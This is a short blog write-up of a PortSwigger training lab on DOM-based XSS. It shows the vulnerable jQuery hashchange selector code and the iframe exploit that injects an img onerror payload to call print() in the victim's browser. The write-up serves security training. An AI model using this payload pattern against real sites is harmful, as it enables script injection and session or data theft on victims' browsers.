---
layout: post
title: "PortSwigger — DOM XSS in jQuery selector sink using a hashchange event [Write-up]"
date: 2025-11-10
platform: portswigger
vulntype: XSS
difficulty: Easy
category: write-up
tags: [xss, web]
---

## Overview

**Lab:** DOM XSS in jQuery selector sink using a hashchange event

**Platform:** PortSwigger

**Difficulty:** Easy  

---

# Description

This lab contains a DOM-based cross-site scripting vulnerability on the home page. It uses jQuery's `$()` selector function to auto-scroll to a given post, whose title is passed via the location.hash property.

To solve the lab, deliver an exploit to the victim that calls the `print()` function in their browser.

## Solution

Let's examine the vulnerable code using Developer Tools.

```
<script>
    $(window).on('hashchange', function(){
        var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
        if (post) post.get(0).scrollIntoView();
    });
</script>
```
The hashchange event in jQuery monitors changes in the URL’s hash. When it changes, decodeURIComponent is called on window.location.hash. If that section exists on the page, the browser scrolls to it.

Now let's create an exploit

```
<iframe src="https://lab-id.web-security-academy.net/#" onload="this.src+='<img src=1 onerror=print(1)>'">
```
<p align="center">
  <img src="/assets/css/img/XXS/XXS18.png" alt="XXS" />
</p>

We press on Deliver exploit to victim
